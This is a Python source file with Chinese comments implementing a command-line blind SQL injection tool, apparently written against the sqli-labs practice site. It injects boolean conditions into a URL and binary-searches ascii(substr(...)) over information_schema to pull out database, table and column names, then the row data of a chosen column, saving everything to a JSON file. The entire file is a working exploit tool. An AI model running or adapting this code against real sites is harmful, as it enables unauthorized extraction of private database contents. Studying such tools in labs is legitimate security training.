from sys import argv
from requests import get
import getopt
import json
class Platform:

    def __init__(self):

        self.argv = argv[1:]
        self.url = ""
        self.databases_num = 2
        self.database = ""
        self.table = ""
        self.column = ""
        self.databases_name ={}
        filename = "Database_information.json"
        try:
            with open(filename,"r") as f:
                self.databases_name=json.loads(f.read())
        except FileNotFoundError:
            with open(filename,"w") as f:
                f.write(json.dumps(self.databases_name))

    def InPut(self):
        """
        命令参数处理，所具有的问题就是需要按照顺序输入
        :return:
        """
        # opts是正常数据，args是没有-的数据
        opts = []
        try:
            opts, args = getopt.getopt(self.argv, "hu:D:T:C:", ["databases", "tables", "columns"])
        except getopt.GetoptError:
            #print("开头")
            self.Help()
        #print(opts)
        if opts == []:
            #exit()
            #print("空")
            self.Help()
        for opt,arg in opts:
            if opt=="-h":
                #print("help")
                 self.Help()
            elif opt == "-u":
                self.url = arg
            elif opt == "--databases":
                self.DataBases()
            elif opt == "-D":
                self.database = arg
            elif opt == "--tables":
                self.Tables(self.database)
            elif opt == "-T":
                self.table = arg
            elif opt == "--columns":
                self.Columns(self.database,self.table)
            elif opt == "-C":
                self.column = arg
                self.Data(self.database,self.table,self.column)
            else :
                #print("end help")
                self.Help()

    def Help(self):
        print("参数：")
        print("    -h 查看帮助")
        print("    -u 已经绕过单引号的url")
        print("    --databases查看数据库\n    -D 输入数据库")
        print("    --tables查看表\n    -T 需要查看的表")
        print("    --columns查看所有列\n    -C 需要查看的列")
        print("不能输入' 需要用%27代替才行")

    def Json_save(self):
        filename = "Database_information.json"

        with open(filename,"w") as f:
            f.write(json.dumps(self.databases_name))

    def RE(self, url, up, down):
        """
        递归折半查找核心
        :param up:
        :param down:
        :return:
        """
        result = "?"
        if up < down:
            print("error")
            exit()
        mid = (up + down) // 2
        if "You are in..........." in get((url+f">{mid}--+")).text :
            #print(url+f">{mid}--+")
            result = self.RE(url, up, mid)
        elif "You are in..........." in get((url+f"<{mid}--+")).text:
            #print(url+f"<{mid}--+")
            result = self.RE(url, mid, down)
        elif "You are in..........." in get((url+f"={mid}--+")).text:
            #print("ok")
            result = mid
        else:
            print("RE ERROR")
            print(url+f"={mid}--+")
            exit()
        return result

    def DataBases(self):
        """

        :return:
        """
        """
        爆出当前数据库的长度
        """
        #num = 1
        #url = self.url + f"and length(database())={num} --+"
        #while("You are in..........." not in get(url).text):   # 跑当前数据库的名字数据库的长度
        #    num +=1
        #    url = self.url + f"and length(database())={num} --+"
        #print(num)

        """
        查询所有数据库的数量
        """
        databses_num = 2 # 默认有两个数据库
        url = self.url + f"and (SELECT COUNT(*) from information_schema.schemata) = {databses_num} --+"

        while("You are in..........." not in get(url).text):
            databses_num += 1
            url = self.url + f" and (SELECT COUNT(*) from information_schema.schemata) = {databses_num} --+"

        print(f"查询到的数据库有{databses_num}个")
        print("正在盲注...")
        self.databases = databses_num
        """
        爆每个数据库
        """
        for _num in range (0,databses_num):
            # 查询当前数据库的长度
            _name = ""

            this_length = 1
            payload_num = f"and (SELECT length(SCHEMA_NAME) FROM information_schema.SCHEMATA LIMIT {_num},1) "
            url = self.url + payload_num + f"={this_length} --+"
            while "You are in..........." not in get(url).text:
                this_length += 1
                payload_num = f"and (SELECT length(SCHEMA_NAME) FROM information_schema.SCHEMATA LIMIT {_num},1) "
                url = self.url + payload_num + f"={this_length} --+"


            #print(this_length)

            #爆该库的字符
            # 查询每一个字符
            for __length in range (1,this_length+1):
                # ascii从48--122
                # 描述当前库名的payload

                payload_str = f"and ascii(substr((SELECT schema_name from information_schema.schemata LIMIT {_num},1),{__length},1))"
                url = self.url + payload_str
                #print(url)
                a = self.RE(url, 123, 48)
                _name += chr(a)
                #exit()
            self.databases_name.update({f"{_name}":""})
            #print(_name)
        print("盲注结果：")
        print(self.databases_name)
        print("结果已保存")
        self.Json_save()

    def Tables(self,database_name):
        """
        输入库名，查下面的表
        :param database_name:
        :return:
        """
        if database_name not in self.databases_name.keys():
            print("数据库不存在，请先查询数据库，或者重新输入")
            exit()
        # 查有几个表
        payload_table_num = f"SELECT count(*) from information_schema.tables WHERE table_schema = '{database_name}'"
        Tables_num = 0
        while "You are in..........." not in get(self.url + f"and ({payload_table_num})={Tables_num}--+").text :
            Tables_num += 1
            # print(self.url + f"and ({payload_table_num})={Tables_num}--+")
            if Tables_num == 100 :
                print("ERROR7")
                exit()
        print(f"正在查询{database_name}下的表")
        print(f"共查询到{Tables_num}个表")
        print("正在盲注...")
        if Tables_num == 0 :
            print("OVER")
            exit()
        # 爆每个表
        Table_name = {}
        for _table_num in range(0,Tables_num ): # limit限制是从0开始的
            # 爆一个表,第_table_num个
            Payload_table_name1 = f"SELECT length(table_name) from information_schema.tables WHERE table_schema = '{database_name}' limit {_table_num},1"
            _table_name_num = 1
            Payload_table_name2 = f"and({Payload_table_name1})={_table_name_num}--+"
            # 查看当前表的长度
            while "You are in..........." not in get(self.url + Payload_table_name2).text:
                _table_name_num += 1
                Payload_table_name2 = f"and({Payload_table_name1})={_table_name_num}--+"
                if _table_name_num >50 :
                    print(self.url +f"and ({Payload_table_name1})={_table_name_num}--+")
                    print("length ERROR")
                    exit()
            # 依次取出字符对比：
            _table_name = ""
            Payload_table_name1 = f"SELECT table_name from information_schema.tables WHERE table_schema = '{database_name}'"
            for _table_name_str in range(1,_table_name_num + 1):
                Payload_table_name3 = f"and ascii(SUBSTR(({Payload_table_name1} limit {_table_num},1),{_table_name_str},1))"
                a=self.RE((self.url + Payload_table_name3), 123, 48)
                _table_name += chr(a)
            Table_name.update({_table_name:''})
        print("盲注结果：")
        self.databases_name[database_name]=Table_name
        print(Table_name)
        self.Json_save()
        print("数据已保存")

    def Columns(self,Database,Table):
        """
        查表的列名
        :param Database:
        :param Table:
        :return:
        """
        # 检查是否有效：
        if Table not in self.databases_name[Database].keys():
            print("输入的表有问题，请先查看表，或者检查重新输入")
            exit()
        # 查有几列
        # select count(*) from {}.{}
        _columns_num = 1
        Payload_columns_num1 = f"and (select count(*) from information_schema.columns where table_schema='{Database}' and table_name='{Table}')={_columns_num}--+"
        #print(self.url + Payload_columns_num1)
        while "You are in..........." not in get(self.url + Payload_columns_num1).text:
            _columns_num += 1
            Payload_columns_num1 = f"and (select count(*) from information_schema.columns where table_schema='{Database}' and table_name='{Table}')={_columns_num}--+"
            if _columns_num >50:
                print(self.url + Payload_columns_num1)
                print("length error")
                exit()
        print(f"正在查询{Database}库下的{Table}表下的列")
        print(f"共查询到{_columns_num}个表")
        print("正在盲注...")
        #遍历所有的列名字
        Columns_name ={}
        for _columns_name in range(0,_columns_num):
            # 查该列的名字长度
            _columns_name_length = 1
            Payload_columns_name_length = f"select length(column_name) from information_schema.columns where table_name ='{Table}' limit {_columns_name},1"
            Payload_columns_name_length1 = f"and ({Payload_columns_name_length})={_columns_name_length}--+"

            while "You are in..........." not in get(self.url + Payload_columns_name_length1).text:
                _columns_name_length += 1
                Payload_columns_name_length1 = f"and ({Payload_columns_name_length})={_columns_name_length}--+"
            #print(_columns_name_length)

            # 爆每一个字符
            Payload_columns_name_str = f"select column_name from information_schema.columns where table_name ='{Table}' limit {_columns_name},1"
            _name_str = ""
            for _columns_name_str in range(1,_columns_name_length + 1):
                Payload_columns_name_str1 = f"and ascii(substr(({Payload_columns_name_str}),{_columns_name_str},1))"
                a = self.RE(self.url+Payload_columns_name_str1,123,48)
                _name_str += chr(a)
                #print(_columns_name_str)
            Columns_name.update({_name_str:""})

        #print(Columns_name)
        self.databases_name[Database][Table]=Columns_name
        print("盲注结果：")
        print(Columns_name)
        #存储值
        self.Json_save()
        print("数据已储存")

    def Data(self,Database,Table,Column):
        """
        爆某一列的数据
        :param Database:
        :param Table:
        :param Column:
        :return:
        """
        # 判断是否有这个列
        if Column not in self.databases_name[Database][Table]:
            print("输入的列异常，请先查看列，或者重新输入")
            exit()
        #查列的个数
        _data_num = 0
        Payload_line_num = f"select count({Column}) from {Database}.{Table}"
        Payload_line_num1 = f"and ({Payload_line_num})={_data_num}--+"
        while "You are in..........." not in get(self.url + Payload_line_num1).text:
            _data_num += 1
            Payload_line_num1 = f"and ({Payload_line_num})={_data_num}--+"
            if _data_num == 50:
                print("ERROR2")
                print(self.url + Payload_line_num1)
                exit()
        print(f"正在查询{Database}库下的{Table}表下的{Column}列")
        print(f"共查询到{_data_num}个数据")
        print("正在盲注...")


        _data = []
        for _data_num_name in range(0,_data_num):
            # 查该列的字符长度
            _data_num_name_length = 1
            Payload_line_name_length = f"select length({Column}) from {Database}.{Table} limit {_data_num_name},1"
            Payload_line_name_length1 = f"and ({Payload_line_name_length})={_data_num_name_length}--+"
            while "You are in..........." not in get(self.url+Payload_line_name_length1).text:
                _data_num_name_length += 1
                Payload_line_name_length1 = f"and ({Payload_line_name_length})={_data_num_name_length}--+"
                if _data_num_name_length == 50:
                    print("ERROR1")
                    print(self.url + Payload_line_name_length1)
                    exit()
            #print("长度",_data_num_name_length)
            _data_name = ""
            Payload_line_name = f"select {Column} from {Database}.{Table} limit {_data_num_name},1"
            for _data_name_str in range(1,_data_num_name_length+1):
                Payload_line_name1 = f"and ascii(substr(({Payload_line_name}),{_data_name_str},1))"
                a = self.RE(self.url+Payload_line_name1,123,48)
                _data_name += chr(a)
            #print("内容",_data_name)
            _data.append(_data_name)
        self.databases_name[Database][Table][Column]=_data
        print("盲注结果：")
        print(_data)
        #存储
        self.Json_save()
        print("数据已储存")

    #def Eche_Data(self,Database,Table,Column,Data=):
# substr 字符从1开始
# limli 限制从开始
# 查数量的时候只需要把查询列换成count(*)就行了
#  查库名字 SELECT schema_name from information_schema.schemata LIMIT {_num},1),{__length},1
#  查表名字 SELECT table_name from information_schema.tables WHERE table_schema = '{ }'
#           ascii(substr((~ limlt {},1)){},1)
#  查列名字 从大表中查
#        查表的数量：select count(*) from information_schema.columns where table_schema='{Database}' and table_name='{Table}')={_columns_num}
#             查某个表的长度：select length(column_name) from information_schema.columns where table_name ='{Table}' limit {_columns_name},1
#             查某个表的名字：select column_name from information_schema.columns where table_name ='{Table}' limit {_columns_name},1
#             嵌套查询：ascii(substr(({}),{},1))
if __name__ == "__main__":
    #url = " "
    plat = Platform()
    plat.InPut()
